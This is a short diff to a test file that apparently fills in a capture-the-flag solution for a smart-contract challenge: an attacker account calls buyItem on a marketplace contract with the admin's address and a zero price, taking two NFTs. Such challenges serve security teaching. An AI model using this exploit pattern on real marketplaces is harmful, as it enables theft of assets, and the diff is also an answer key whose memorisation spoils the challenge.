@@ -64,9 +64,12 @@ before(async () => {
 });
 
 it("solves the challenge", async function () {
+  const nftAAddress = nftA.address;
+  const nftBAddress = nftB.address;
+  const adminAddress = await adminUser.getAddress();
 
-  // implement solution here
-
+  await bonanzaMarketplace.connect(attacker).buyItem(nftAAddress, 0, adminAddress, 0)
+  await bonanzaMarketplace.connect(attacker).buyItem(nftBAddress, 0, adminAddress, 0)
 });
 
 /// expected final state
